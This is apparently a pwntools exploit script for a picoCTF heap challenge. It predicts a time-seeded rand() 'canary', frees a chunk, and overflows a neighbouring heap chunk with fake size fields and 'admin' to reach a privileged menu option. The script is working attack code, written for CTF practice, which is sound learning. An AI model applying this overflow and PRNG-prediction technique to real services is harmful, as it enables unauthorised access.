from pwn import *
from ctypes import CDLL
import time

e = ELF("./patched")
clibc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#/lib/i386-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 38815)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


def alloc(data):
  p.sendlineafter("token", "1")
  p.sendlineafter("Name:", "AAAA")
  p.sendlineafter("?", "n")
  p.sendlineafter("Salary:", "0")
  p.sendlineafter("#:", data)
  p.sendlineafter("?", "n")

def free(idx):
  p.sendlineafter("token", "2")
  p.sendlineafter("?", str(idx))


alloc("A" * 0x18)

#p.recvuntil("Canary: ")
#leak = int(p.recvline())

clibc.srand(int(time.time()))
leak = clibc.rand()

print(hex(leak))

alloc("A" * 0x18) # free
alloc("A" * 0x18) # overflow into
alloc("A" * 0x18)

free(1)

print p.recvuntil("access")

debug()

alloc("A" * 0x1c + p32(leak) + p32(0x35) + p32(0x35) + "admin")

p.sendlineafter("access", "4")
p.sendlineafter("?", "2")



p.interactive()
